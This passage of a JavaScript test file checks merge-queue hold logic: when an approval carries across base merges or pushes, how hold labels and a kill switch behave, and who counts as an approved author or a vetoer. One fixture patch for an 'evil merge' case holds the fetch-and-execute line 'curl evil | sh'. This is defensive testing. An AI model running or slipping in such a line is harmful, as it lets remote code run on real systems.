  assert.ok(!world.reads.some((path) => path.includes(`/compare/${OLD}...`) || path.includes(`/compare/${MB_OLD}...`)), world.reads.join(" "));
});

test("a merge that adds anything beyond the base's changes, or a range not read whole, carries nothing", async () => {
  const shape = (merges, based = baseRange([BASE_DOC, SHARED_BASE]), more = {}) => ({ ...REPLAY, across: ranges(merges, based), ...more });
  const many = Array.from({ length: 300 }, (_, i) => ({ filename: `docs/${i}.md`, status: "modified", patch: "+x" }));
  for (const [name, options] of Object.entries({
    "a merge that also edits a hold path": shape(brought([BASE_DOC, SHARED_BASE, { ...HELD_PATCH, patch: "@@ -1 +1 @@\n-b\n+evil" }])),
    "a merge that also edits a non-hold file": shape(brought([BASE_DOC, SHARED_BASE, HELPER])),
    "a merge that changes the base's hunk": shape(brought([BASE_DOC, { ...SHARED_BASE, patch: "@@ -10,6 +10,11 @@ import\n+theirs\n+evil" }])),
    "a merge that renames a base file": shape(brought([{ ...BASE_DOC, status: "renamed", previous_filename: "docs/old.md" }, SHARED_BASE])),
    "a base change reverted inside the merge": shape(brought([SHARED_BASE])),
    "a base that changed a file the merges did not bring": shape(brought(), baseRange([BASE_DOC, SHARED_BASE, HELPER])),
    "a merge whose second parent the base does not hold": shape(brought([BASE_DOC, SHARED_BASE]), undefined, {
      compares: { [OLD]: atOld([HELD_PATCH, SHARED_AT_OLD]), [HEAD]: { ...merged([HELD_PATCH, SHARED_AT_HEAD]), commits: [{ sha: OLD, parents: [{ sha: MAIN }] }, { sha: OTHER, parents: [{ sha: MAIN }, { sha: MAIN }] }, { sha: HEAD, parents: [{ sha: OLD }, { sha: OTHER }] }], total_commits: 3 } },
    }),
    "a non-merge commit beside the merge": shape(brought([BASE_DOC, SHARED_BASE]), undefined, {
      compares: { [OLD]: atOld([HELD_PATCH, SHARED_AT_OLD]), [HEAD]: { ...merged([HELD_PATCH, SHARED_AT_HEAD]), commits: [{ sha: OLD, parents: [{ sha: MAIN }] }, { sha: OTHER, parents: [{ sha: OLD }, { sha: MAIN }] }, { sha: HEAD, parents: [{ sha: OTHER }] }], total_commits: 3 } },
    }),
    "300 files brought": shape(brought(many), baseRange(many)),
    "300 files in the base's range": shape(brought([BASE_DOC, SHARED_BASE]), baseRange(many)),
    "a brought file with no patch": shape(brought([BASE_DOC, { ...SHARED_BASE, patch: undefined }]), baseRange([BASE_DOC, { ...SHARED_BASE, patch: undefined }])),
    "a brought commit list cut short": shape(brought([BASE_DOC, SHARED_BASE], { total_commits: 251 })),
    "a base range commit list cut short": shape(brought([BASE_DOC, SHARED_BASE]), baseRange([BASE_DOC, SHARED_BASE], { total_commits: 251 })),
    "a head range that is not ahead": shape(brought([BASE_DOC, SHARED_BASE], { status: "diverged", behind_by: 1 })),
    "a base range that goes backwards": shape(brought([BASE_DOC, SHARED_BASE]), baseRange([BASE_DOC, SHARED_BASE], { status: "behind", behind_by: 1 })),
    "no merge base on the approved head's compare": { ...REPLAY, compares: { [OLD]: { ...atOld([HELD_PATCH, SHARED_AT_OLD]), merge_base_commit: null }, [HEAD]: merged([HELD_PATCH, SHARED_AT_HEAD]) } },
    "an unreadable range compare": { ...REPLAY, fail: `/compare/${OLD}...` },
    "a dismissal with a message": { ...REPLAY, reviews: [DISMISSED_OLD], timeline: [stale({ dismissal_message: "stale" })] },
  })) {
    const run = await lifting(liftWorld(options));
    if (UNGATED_CARRIES.has(name)) {
      assert.equal(run.code, 0, `${name}: ${run.out}`);
      assert.match(run.out, /which lifts its hold path/, name);
      continue;
    }
    assert.equal(run.code, 1, `${name}: ${run.out}`);
    assert.match(run.out, HOLD_REASON, name);
  }
});

test("no adversarial history, approval or reviewer carries a lift to the head", async () => {
  const cases = {
    "a merge that also edits a hold path (an evil merge)": {
      compares: { [OLD]: atOld(), [HEAD]: merged([{ ...HELD_PATCH, patch: "@@ -1 +1 @@\n-a\n+evil" }]) },
      across: ranges(brought([BASE_DOC, { ...HELD_PATCH, patch: "@@ -1 +1 @@\n-b\n+evil" }])),
    },
    "a merge that adds a hold path": { compares: { [OLD]: atOld(), [HEAD]: merged([HELD_PATCH, OTHER_HELD]) }, across: ranges(brought([BASE_DOC, OTHER_HELD])) },
    // The re-review of #10596: a merge that rewrites a non-hold file the
    // approved head already changed, or adds one, writes a change of its own.
    "a merge that rewrites scripts/helper.sh, which the approved head changed": {
      compares: { [OLD]: atOld([HELD_PATCH, HELPER]), [HEAD]: merged([HELD_PATCH, { ...HELPER, patch: "@@ -1 +1 @@\n-x\n+curl evil | sh" }]) },
      across: ranges(brought([BASE_DOC, { ...HELPER, patch: "@@ -1 +1 @@\n-y\n+curl evil | sh" }])),
    },
    "a merge that adds a file the base touched, with content of its own": {
      compares: { [OLD]: atOld(), [HEAD]: merged([HELD_PATCH, { filename: "scripts/lib.mjs", status: "modified", patch: "@@ -1 +1 @@\n-base\n+evil" }]) },
      across: ranges(brought([BASE_DOC, { filename: "scripts/lib.mjs", status: "modified", patch: "@@ -1 +1 @@\n-base\n+evil" }]), baseRange([BASE_DOC, { filename: "scripts/lib.mjs", status: "modified", patch: "@@ -1 +1 @@\n-lib\n+base" }])),
    },
    "a merge after which the base holds one of the approved head's files": {
      compares: { [OLD]: atOld([HELD_PATCH, OTHER_HELD]), [HEAD]: merged([HELD_PATCH]) },
      across: ranges(brought(), baseRange([BASE_DOC, OTHER_HELD])),
    },
    "a non-merge commit after the approval": { compares: { [OLD]: atOld(), [HEAD]: { files: [HELD_PATCH], commits: [{ sha: OLD, parents: [{ sha: MAIN }] }, { sha: HEAD, parents: [{ sha: OLD }] }], total_commits: 2 } } },
    "a merge of a branch other than the base": {
      compares: { [OLD]: atOld(), [HEAD]: { files: [HELD_PATCH], commits: [{ sha: OLD, parents: [{ sha: MAIN }] }, { sha: OTHER, parents: [{ sha: MAIN }] }, { sha: HEAD, parents: [{ sha: OLD }, { sha: OTHER }] }], total_commits: 3 } },
    },
    "a crafted merge whose second parent the base does not hold": {
      compares: { [OLD]: atOld(), [HEAD]: { files: [HELD_PATCH], commits: [{ sha: OLD, parents: [{ sha: MAIN }] }, { sha: OTHER, parents: [{ sha: MAIN }, { sha: MAIN }] }, { sha: HEAD, parents: [{ sha: OLD }, { sha: OTHER }] }], total_commits: 3 } },
    },
    "a merge whose parents are not commit objects": { compares: { [OLD]: atOld(), [HEAD]: { files: [HELD_PATCH], commits: [{ sha: OLD, parents: [{ sha: MAIN }] }, { sha: HEAD, parents: [OLD, MAIN] }], total_commits: 2 } } },
    "a force push that rewrites the approved head": {
      compares: { [OLD]: atOld(), [HEAD]: { files: [HELD_PATCH], commits: [{ sha: "6".repeat(40), parents: [{ sha: MAIN }] }, { sha: HEAD, parents: [{ sha: "6".repeat(40) }, { sha: MAIN }] }], total_commits: 2 } },
      across: ranges(brought([BASE_DOC], { status: "diverged", behind_by: 1 })),
    },
    "a history longer than the compare lists": { compares: { [OLD]: atOld(), [HEAD]: { ...merged([HELD_PATCH]), total_commits: 251 } } },
    "a head in a fork": { fork: true },
    "a compare that lists fewer files than the pull request changes": { changed: 2 },
    "a base branch that does not resolve to a commit": { tip: "main" },
    "an unreadable base ref": { fail: "/git/ref/" },
    "an approval later dismissed": { reviews: [review("DISMISSED", OLD)] },
    "an approval followed by a request for changes on another head": { reviews: [review("APPROVED", OLD), review("CHANGES_REQUESTED", "8".repeat(40), "2026-10-27T23:40:00Z")] },
    "an approval by a person off the trusted-actor list": { reviews: [review("APPROVED", OLD, APPROVED_AT, 77)] },
    "an approval by a bot account": { reviews: [review("APPROVED", OLD, APPROVED_AT, 5, "Bot")] },
    "unreadable reviews": { fail: "/reviews?" },
    "an unreadable pull request": { fail: "/pulls/99" },
    "an unreadable compare": { fail: "/compare/" },
  };
  for (const [name, options] of Object.entries(cases)) {
    const run = await lifting(liftWorld(options));
    if (UNGATED_CARRIES.has(name)) {
      assert.equal(run.code, 0, `${name}: ${run.out}`);
      assert.match(run.out, /which lifts its hold path/, name);
      continue;
    }
    assert.equal(run.code, 1, `${name}: ${run.out}`);
    assert.match(run.out, HOLD_REASON, name);
  }
});

test("an approval carried over a base merge lifts no verifier hold, and an exact-head approval in the discussion needs no reads", async () => {
  const carried = await lifting(liftWorld(), { queue: true });
  assert.equal(carried.code, 1, carried.out);
  assert.match(carried.out, /lifts its hold path/);
  assert.match(carried.out, /pr-verify has not passed this head/);
  assert.match(carried.out, /its pr-verify FAILs could not be read/);
  const world = liftWorld();
  const exact = await lifting(world, { reviews: [review("APPROVED", HEAD)] });
  assert.equal(exact.code, 0, exact.out);
  assert.deepEqual(world.reads, []);
});

// The independent security review of #10671: the compare API reports no
// file mode, so the exact path reads the head's and its merge base's trees and
// requires each brought file's mode to be the base's; and the carry runs only
// on a base that is the repository's default branch.
test("the exact carry reads file modes from the trees, and a non-default base carries nothing", async () => {
  const flipped = FILES_AT.map(([path]) => [path, path === "docs/base.md" ? "100755" : "100644"]);
  const heldFlip = FILES_AT.map(([path]) => [path, path === SHARED_AT_OLD.filename ? "100755" : "100644"]);
  for (const [name, options] of Object.entries({
    "a merge that also flips a base file's mode": { ...REPLAY, modes: trees(treeOf(flipped)) },
    "a merge that flips the mode of a file both sides changed": { ...REPLAY, modes: trees(treeOf(heldFlip)) },
    "a brought file missing from the head's tree": { ...REPLAY, modes: trees(treeOf(FILES_AT.filter(([path]) => path !== "docs/base.md"))) },
    "a brought file missing from both trees": { ...REPLAY, modes: trees(treeOf(FILES_AT.filter(([path]) => path !== "docs/base.md")), treeOf(FILES_AT.filter(([path]) => path !== "docs/base.md"))) },
    "a brought file missing from the base's tree": { ...REPLAY, modes: trees(undefined, treeOf(FILES_AT.filter(([path]) => path !== "docs/base.md"))) },
    "a truncated head tree": { ...REPLAY, modes: trees(treeOf(FILES_AT, { truncated: true })) },
    "a base tree with no truncated flag": { ...REPLAY, modes: trees(undefined, { tree: treeOf(FILES_AT).tree }) },
    "an unreadable tree": { ...REPLAY, fail: "/git/trees/" },
    "an exact carry into a base that is not the default branch": { ...REPLAY, base: "release" },
    "a same-net-change carry into a base that is not the default branch": { base: "release" },
    "an unreadable repository": { defaultBranch: null },
  })) {
    const run = await lifting(liftWorld(options));
    if (UNGATED_CARRIES.has(name)) {
      assert.equal(run.code, 0, `${name}: ${run.out}`);
      assert.match(run.out, /which lifts its hold path/, name);
      continue;
    }
    assert.equal(run.code, 1, `${name}: ${run.out}`);
    assert.match(run.out, HOLD_REASON, name);
  }
  const removed = { filename: "docs/gone.md", status: "removed", patch: "@@ -1 +0,0 @@\n-x" };
  const world = liftWorld({ ...REPLAY, across: ranges(brought([BASE_DOC, SHARED_BASE, removed]), baseRange([BASE_DOC, SHARED_BASE, removed])) });
  const run = await lifting(world);
  assert.equal(run.code, 0, run.out);
  assert.ok(world.reads.includes(`/repos/owner/repo/git/trees/${HEAD}?recursive=1`) && world.reads.includes(`/repos/owner/repo/git/trees/${MB_HEAD}?recursive=1`), world.reads.join(" "));
  const exact = liftWorld({ base: "release", reviews: [review("APPROVED", HEAD)] });
  assert.equal((await lifting(exact, { reviews: [] })).code, 0);
});

test("baseMergesOnly and baseMergeCarry read their inputs strictly", () => {
  const then = { commits: [{ sha: OLD, parents: [{ sha: MAIN }] }], total_commits: 1 };
  const inBase = new Set([MAIN]);
  assert.equal(baseMergesOnly(then, merged([]), OLD, inBase), true);
  assert.equal(baseMergesOnly(then, merged([]), OLD), false);
  assert.deepEqual(mergedParents(then, merged([])), [MAIN]);
  assert.equal(baseMergesOnly(then, { commits: [{ sha: OLD, parents: [{ sha: MAIN }] }, { sha: HEAD, parents: [{ sha: OLD }, { sha: MAIN }] }] }, OLD, inBase), false);
  assert.equal(baseMergesOnly(then, merged([]), "9".repeat(40), inBase), false);
  assert.equal(baseMergeCarry(atOld([HELD_PATCH, HELPER]), merged([HELPER, HELD_PATCH]), OLD, [MAIN]), true);
  assert.equal(baseMergeCarry(atOld([HELD_PATCH, HELPER]), merged([HELD_PATCH, { ...HELPER, patch: "+z" }]), OLD, [MAIN]), false);
  assert.equal(baseMergeCarry(atOld([HELD_PATCH]), merged([HELD_PATCH, HELPER]), OLD, [MAIN]), false);
  assert.equal(baseMergeCarry(atOld([HELD_PATCH]), merged([HELD_PATCH]), OLD, []), false);
});

test("exactBaseCarry, approvalCarry and autoDismissed read their inputs strictly", () => {
  const { approvalCarry, autoDismissed, exactBaseCarry } = holdsModule;
  const same = [treeOf(FILES_AT), treeOf(FILES_AT)];
  assert.equal(exactBaseCarry(brought([BASE_DOC, SHARED_BASE]), baseRange([SHARED_BASE, BASE_DOC]), same), true);
  assert.equal(exactBaseCarry(brought([BASE_DOC, SHARED_BASE]), baseRange([SHARED_BASE, BASE_DOC])), false);
  assert.equal(exactBaseCarry(brought([BASE_DOC]), baseRange([BASE_DOC, SHARED_BASE]), same), false);
  assert.equal(exactBaseCarry(brought([BASE_DOC, SHARED_BASE]), baseRange([BASE_DOC]), same), false);
  assert.equal(exactBaseCarry(brought([]), { status: "identical", behind_by: 0, files: [], commits: [], total_commits: 0 }, same), true);
  assert.equal(exactBaseCarry(brought(), null, same), false);
  assert.equal(exactBaseCarry(brought(undefined, { behind_by: undefined }), baseRange(), same), false);
  assert.equal(exactBaseCarry(brought(undefined, { commits: undefined }), baseRange(), same), false);
  assert.equal(exactBaseCarry(brought([BASE_DOC]), baseRange([BASE_DOC]), [treeOf([["docs/base.md", "100755"]]), treeOf([["docs/base.md"]])]), false);
  assert.equal(exactBaseCarry(brought([BASE_DOC]), baseRange([BASE_DOC]), [treeOf([["docs/base.md"]], { truncated: true }), treeOf([["docs/base.md"]])]), false);
  const gone = { filename: "docs/gone.md", status: "removed", patch: "-x" };
  assert.equal(exactBaseCarry(brought([gone]), baseRange([gone]), same), true);
  assert.equal(exactBaseCarry(brought([gone]), baseRange([gone]), [treeOf([["docs/gone.md"]]), treeOf([])]), false);
  const moved = { ...BASE_DOC, status: "renamed", previous_filename: "docs/old.md" };
  assert.equal(exactBaseCarry(brought([moved]), baseRange([moved]), same), true);
  assert.equal(exactBaseCarry(brought([moved]), baseRange([moved]), [treeOf([...FILES_AT, ["docs/old.md"]]), treeOf(FILES_AT)]), false);
  const [then, now] = [atOld([HELD_PATCH, SHARED_AT_OLD]), merged([HELD_PATCH, SHARED_AT_HEAD])];
  const [merges, based] = [brought([BASE_DOC, SHARED_BASE]), baseRange([BASE_DOC, SHARED_BASE])];
  const modes = [treeOf(FILES_AT), treeOf(FILES_AT)];
  assert.equal(approvalCarry(then, now, OLD, [MAIN], merges, based, null, modes), true);
  assert.equal(approvalCarry(then, now, OLD, [], merges, based, null, modes), false);
  assert.equal(approvalCarry(then, now, OLD, [MAIN], null, null, null, modes), false);
  assert.equal(approvalCarry(then, now, OLD, [MAIN], merges, based), false);
  assert.equal(approvalCarry(atOld(), merged([HELD_PATCH]), OLD, [MAIN], null, null), true);
  assert.equal(approvalCarry(then, now, OLD, [MAIN], merges, based, HEAD, modes), true);
  assert.equal(approvalCarry(then, now, OLD, [MAIN], merges, based, OLD, modes), false);
  assert.equal(approvalCarry(then, now, OLD, [MAIN], merges, based, OTHER, modes), false);
  assert.deepEqual([...autoDismissed([STALE, { event: "reviewed" }, null])], [["41", HEAD]]);
  assert.deepEqual([...autoDismissed([STALE, stale({ dismissal_message: "x" })])], []);
  assert.deepEqual([...autoDismissed("not a list")], []);
});

// The owner's decision Q10 of 2026-10-28, verbatim in #10759: "go w/
// recommendations". An approval of H0 stays valid at H1 when the diff H0...H1
// touches no hold-path file; a push that touches one needs a new approval,
// a test-only or comment-only edit included. The peer review of #10737 adds
// the files hold paths load (REVIEW_FLOOR, CARRY_REFUSES).
const H0 = "a".repeat(40);
const H1 = "b".repeat(40);
const pushed = (files, extra = {}) => ({ status: "ahead", behind_by: 0, files: files.map((filename) => ({ filename, status: "modified", patch: "+x" })), commits: [{ sha: H1 }], total_commits: 1, ...extra });
const carriesQ10 = (merges, holdPaths = [], dismissal = null) => approvalCarry(null, null, H0, [], merges, null, dismissal, null, holdPaths);

test("Q10: an approval carries over a push that touches no hold path", () => {
  assert.equal(carriesQ10(pushed(["docs/a.md", "plugins/work-items/README.md"])), true);
  assert.equal(carriesQ10(pushed(["docs/a.md"]), [], H1), true, "a stale dismissal by the push it checks");
  assert.equal(approvalCarry(null, null, H0, [], pushed(["docs/a.md"]), null, null, null), false);
});

test("Q10: a push that touches any hold path, a configured one or a file a hold path loads refuses", () => {
  for (const [name, files, holdPaths] of [
    ["a gated file", [".github/scripts/pr-merge/merge-holds.mjs"], []],
    ["a test-only edit to a gated file's directory", [".github/scripts/pr-merge/merge-holds.test.mjs"], []],
    ["a comment-only edit to a gated file", ["plugins/source-control/skills/babysit-prs/scripts/babysit_merge_policy.py"], []],
    ["a rename off a gated file", ["docs/moved.md"], []],
    ["a configured hold path", ["docs/conventions/held.md"], ["docs/conventions/**"]],
    ["a helper a gated file imports", ["plugins/source-control/skills/babysit-prs/scripts/babysit_util.py"], []],
    ["a script ci-status runs", ["scripts/check-stale-base-overlap.sh"], []],
    ["an action a hold-path workflow uses", [".github/actions/report-check-run/report-check-run.mjs"], []],
    ["a workflow", [".github/workflows/pr-review-hosted.yml"], []],
  ]) {
    const merges = pushed(files);
    if (name === "a rename off a gated file") merges.files[0].previous_filename = ".github/actions/request-lane-token/action.yml";
    assert.equal(carriesQ10(merges, holdPaths), false, name);
    assert.equal(ungatedSince(merges, holdPaths), false, name);
  }
  assert.ok(CARRY_REFUSES.includes("scripts/**"));
});

test("Q10: a compare not read whole, not ahead, or with a dismissal the push did not make refuses", () => {
  const many = Array.from({ length: 300 }, (_, i) => `docs/${i}.md`);
  for (const [name, merges, dismissal] of [
    ["an unreadable compare", null, null],
    ["300 files listed", pushed(many), null],
    ["a commit list cut short", pushed(["docs/a.md"], { total_commits: 251 }), null],
    ["a diverged head", pushed(["docs/a.md"], { status: "diverged", behind_by: 1 }), null],
    ["a file with no name", { ...pushed([]), files: [{ status: "modified" }] }, null],
    ["a stale dismissal by another commit", pushed(["docs/a.md"]), "c".repeat(40)],
  ]) {
    assert.equal(carriesQ10(merges, [], dismissal), false, name);
  }
  assert.equal(carriesQ10(pushed(["docs/a.md"]), null), false, "unread hold paths");
});

// The queue holds select-tests checks before the lanes (#10747). Expected
// reasons are ci-status's own error texts for the same holds: its hold-label
// step's three label errors, its pr-unblock step's error and its lanes App
// step's kill-switch error, which reconcile.test.mjs keys on.
const QUEUED = "fedcba9876543210fedcba9876543210fedcba98";
const queuedPull = (over = {}) => ({ number: 7, head: { sha: QUEUED }, labels: [], user: { id: 42, type: "User" }, ...over });
const ON = { appId: "99", disabled: "false", repoDisabled: "false" };

test("queueHolds: a pull request with no hold label or switch passes", () => {
  assert.deepEqual(holdsModule.queueHolds({ pull: queuedPull(), tracker: null, lanes: ON }), []);
});

test("queueHolds: each hold label holds with ci-status's text", () => {
  for (const [label, want] of [
    ["do-not-merge", "#7 carries the 'do-not-merge' label; the merge queue removes it. Remove the label and re-queue to merge."],
    ["needs-human", "#7 carries 'needs-human'; the merge queue removes it. Removing the label approves this pull request; re-queue it to merge."],
    ["pr-verify-failed", "#7 carries 'pr-verify-failed': pr-verify failed its head, and a pr-verify pass removes the label, at a new commit or at the same head: once a trusted person edits the body, and only trusted people have edited it since the fail, that head is judged again, so a fail on the body or the issues it links needs only the body fixed, no new commit. The merge queue removes it; re-queue it once the label is off."],
    ["security: outside-actor", "#7 carries 'security: outside-actor': someone outside the organization wrote on it, and only a person removes the label. Re-queue it once the label is off."],
  ]) {
    assert.deepEqual(holdsModule.queueHolds({ pull: queuedPull({ labels: [{ name: "bug" }, { name: label }] }) }), [want], label);
  }
  assert.equal(holdsModule.queueHolds({ pull: queuedPull({ labels: [{ name: "do-not-merge" }, { name: "needs-human" }] }) }).length, 2);
});

test("security: outside-actor is a hold label of its own, beside the human-gated one", async () => {
  assert.equal(holdsModule.OUTSIDE_ACTOR_LABEL, "security: outside-actor");
  const { HOLD_LABELS } = await import("./enable-auto-merge.mjs");
  assert.ok(HOLD_LABELS.includes(holdsModule.OUTSIDE_ACTOR_LABEL), HOLD_LABELS.join(", "));
  const { LABEL } = await import("../security-outside-actor/flag.mjs");
  assert.equal(LABEL, holdsModule.OUTSIDE_ACTOR_LABEL);
});

test("queueHolds: the human-gated label is the tracker's, trimmed, else needs-human", () => {
  const tracker = { config: { role_labels: { "human-gated": "  hitl " } } };
  assert.deepEqual(holdsModule.queueHolds({ pull: queuedPull({ labels: [{ name: "needs-human" }] }), tracker }), []);
  assert.deepEqual(holdsModule.queueHolds({ pull: queuedPull({ labels: [{ name: "hitl" }] }), tracker }), [
    "#7 carries 'hitl'; the merge queue removes it. Removing the label approves this pull request; re-queue it to merge.",
  ]);
  for (const blank of [{ config: { role_labels: { "human-gated": " " } } }, { config: {} }, [], "x", null]) {
    assert.equal(holdsModule.humanGatedLabel(blank), "needs-human", JSON.stringify(blank));
  }
});

test("trackerBindingText: a .yaml file's tracker mapping as JSON, null when it binds none; any other file as is", () => {
  const dir = tempDir("tracker-binding-");
  const yaml = join(dir, "work-items.yaml");
  writeFileSync(yaml, 'ai_disclaimer: false\ntracker:\n  schema_version: "1.0"\n  provider: "github"\n  config:\n    lease_ttl_hours: 24\n    role_labels:\n      human-gated: "hitl"\n');
  const bound = JSON.parse(holdsModule.trackerBindingText(yaml));
  assert.deepEqual(bound, { schema_version: "1.0", provider: "github", config: { lease_ttl_hours: 24, role_labels: { "human-gated": "hitl" } } });
  assert.equal(holdsModule.humanGatedLabel(bound), "hitl");
  writeFileSync(yaml, "ai_disclaimer: false\n");
  assert.equal(JSON.parse(holdsModule.trackerBindingText(yaml)), null);
  writeFileSync(yaml, "tracker: [unclosed\n");
  assert.throws(() => holdsModule.trackerBindingText(yaml));
  const json = join(dir, ".work-item-tracker.json");
  writeFileSync(json, '{"provider":"github"}');
  assert.equal(holdsModule.trackerBindingText(json), '{"provider":"github"}');
  assert.throws(() => holdsModule.trackerBindingText(join(dir, "absent.yaml")), { code: "ENOENT" });
  assert.equal(holdsModule.TRACKER_BINDING_PATH, "docs/conventions/work-items.yaml");
  const path = process.env.PATH;
  process.env.PATH = dir;
  try {
    const missing = (() => {
      try {
        holdsModule.trackerBindingText(yaml);
      } catch (error) {
        return error;
      }
      return null;
    })();
    assert.ok(missing instanceof Error && missing.code !== "ENOENT", "a missing yq must not read as an absent binding file");
  } finally {
    process.env.PATH = path;
  }
});

test("queueHolds: the kill switch holds only the lanes App's pull request, until both read false", () => {
  const app = { user: { id: 99, type: "Bot" } };
  const text =
    "#7: the lanes kill switch is on (CLAUDE_LANES_DISABLED or CLAUDE_LANES_REPO_DISABLED is not 'false'), so no lanes App pull request merges; it merges once both read 'false' and ci-status is re-run, which the lost-runs reconciler does when this is the run's only failure.";
  for (const [name, lanes] of [
    ["on", { ...ON, disabled: "true" }],
    ["repo on", { ...ON, repoDisabled: "1" }],
    ["unset", { appId: "99" }],
  ]) {
    assert.deepEqual(holdsModule.queueHolds({ pull: queuedPull(app), lanes }), [text], name);
  }
  assert.deepEqual(holdsModule.queueHolds({ pull: queuedPull(app), lanes: ON }), []);
  assert.deepEqual(holdsModule.queueHolds({ pull: queuedPull(), lanes: { appId: "99", disabled: "true" } }), [], "a person's");
  assert.deepEqual(holdsModule.queueHolds({ pull: queuedPull({ user: { id: 99, type: "User" } }), lanes: { appId: "99" } }), [], "a User with the id");
  assert.deepEqual(holdsModule.queueHolds({ pull: queuedPull(app), lanes: { appId: "", disabled: "true" } }), [], "no app id");
});

test("queueHolds: a pull request or label list that does not read throws", () => {
  assert.throws(() => holdsModule.queueHolds({ pull: { number: 7, head: {} } }), /does not read/);
  assert.throws(() => holdsModule.queueHolds({ pull: queuedPull({ labels: null }) }), /labels are not a list/);
});

test("a member naming the do-not-merge label is no veto; saying not to merge is", () => {
  const said = (body) => [{ login: "kyle-sexton", isUser: true, association: "OWNER", at: "2026-10-30T01:00:00Z", body }];
  for (const body of [
    "Apply the `do-not-merge` label before writing any explanation.",
    "Removed the do-not-merge label; the hold reason is gone.",
  ]) {
    assert.deepEqual(holdsModule.vetoers(said(body)), [], body);
  }
  for (const body of [
    "Do not merge this yet.",
    "don't merge",
    "do-not-merge",
    "do-not-merge: waiting on #10954",
    "Not ready, do-not-merge until Friday.",
    "The checks are failing, do-not-merge until they pass.",
    "`do-not-merge` label please",
    "Hold on, do-not-merge, I'm still reviewing.",
    "Every hold stays: ci-status, gitleaks, do-not-merge, cost holds.",
  ]) {
    assert.deepEqual(holdsModule.vetoers(said(body)), ["kyle-sexton"], body);
  }
});

test("authorSkip judges an author as resolve-pr.mjs and ci-status's queue author checks did", () => {
  const OWNERS = [153232337, 337859524];
  const LANE_ID = "melodic-automation-lanes[bot]";
  const LANE = { id: 337595936, login: LANE_ID, type: "Bot" };
  const LANE_SPELLED = { id: 337595936, login: "Melodic-Automation-Lanes", type: "Bot" };
  const LANE_NAMED_USER = { id: 1, login: "melodic-automation-lanes", type: "User" };
  const OWNER = { id: 153232337, login: "kyle-sexton", type: "User" };
  const OWNER_LOGIN_OTHER_ID = { id: 153232338, login: "kyle-sexton", type: "User" };
  const LISTED_BOT = { id: 337859524, login: "melodic-release[bot]", type: "Bot" };
  const LISTED_ORG = { id: 153232337, login: "kyle-sexton", type: "Organization" };
  const HUMAN = { id: 2, login: "someone", type: "User" };
  const DEPENDABOT = { id: 49699333, login: "dependabot[bot]", type: "Bot" };
  const RENOVATE_APP = { id: 3, login: "app/renovate", type: "Bot" };
  const DEPENDABOT_USER = { id: 5, login: "dependabot", type: "User" };
  const LISTED_DEPENDABOT = { id: 153232337, login: "dependabot[bot]", type: "Bot" };
  const NO_LOGIN_BOT = { id: 6, login: null, type: "Bot" };
  const rows = [
    [LANE, "lane", LANE_ID, null],
    [LANE, "lane-or-owner", LANE_ID, null],
    [LANE, "any", LANE_ID, null],
    [LANE_SPELLED, "lane", LANE_ID, null],
    [LANE_SPELLED, "lane-or-owner", LANE_ID, null],
    [LANE_NAMED_USER, "lane", LANE_ID, "author-not-lane"],
    [LANE_NAMED_USER, "lane-or-owner", LANE_ID, "author-not-lane-or-owner"],
    [LANE_NAMED_USER, "any", LANE_ID, null],
    [OWNER, "lane", LANE_ID, "author-not-lane"],
    [OWNER, "lane-or-owner", LANE_ID, null],
    [OWNER, "any", LANE_ID, null],
    [OWNER_LOGIN_OTHER_ID, "lane-or-owner", LANE_ID, "author-not-lane-or-owner"],
    [LISTED_BOT, "lane", LANE_ID, "author-not-lane"],
    [LISTED_BOT, "lane-or-owner", LANE_ID, null],
    [LISTED_ORG, "lane-or-owner", LANE_ID, "author-not-lane-or-owner"],
    [LISTED_ORG, "any", LANE_ID, null],
    [HUMAN, "lane", LANE_ID, "author-not-lane"],
    [HUMAN, "lane-or-owner", LANE_ID, "author-not-lane-or-owner"],
    [HUMAN, "any", LANE_ID, null],
    [DEPENDABOT, "any", LANE_ID, "dependency-manager"],
    [RENOVATE_APP, "lane-or-owner", LANE_ID, "dependency-manager"],
    [DEPENDABOT_USER, "lane-or-owner", LANE_ID, "author-not-lane-or-owner"],
    [DEPENDABOT_USER, "any", LANE_ID, null],
    [LISTED_DEPENDABOT, "lane-or-owner", LANE_ID, "dependency-manager"],
    [NO_LOGIN_BOT, "lane-or-owner", LANE_ID, "author-not-lane-or-owner"],
    [NO_LOGIN_BOT, "any", LANE_ID, null],
    [LANE, "everyone", LANE_ID, "verify-authors-invalid"],
    [OWNER, "everyone", LANE_ID, "verify-authors-invalid"],
    [LANE, "- lane", LANE_ID, "verify-authors-invalid"],
    [OWNER, "", LANE_ID, "verify-authors-invalid"],
    [LANE, "Lane", LANE_ID, "verify-authors-invalid"],
    [LANE, "lane", "", "author-not-lane"],
    [LANE, "lane", " Melodic-Automation-Lanes ", null],
    [LANE, "lane", "melodic-release[bot]", "author-not-lane"],
    [NO_LOGIN_BOT, "lane", "", "author-not-lane"],
    [LISTED_BOT, "lane", "melodic-release[bot]", null],
  ];
  for (const [user, mode, identity, want] of rows) {
    assert.equal(holdsModule.authorSkip(user, mode, identity, OWNERS), want, JSON.stringify({ user, mode, identity }));
  }
  assert.equal(holdsModule.authorSkip(OWNER, "lane-or-owner", LANE_ID, []), "author-not-lane-or-owner", "an empty list");
});
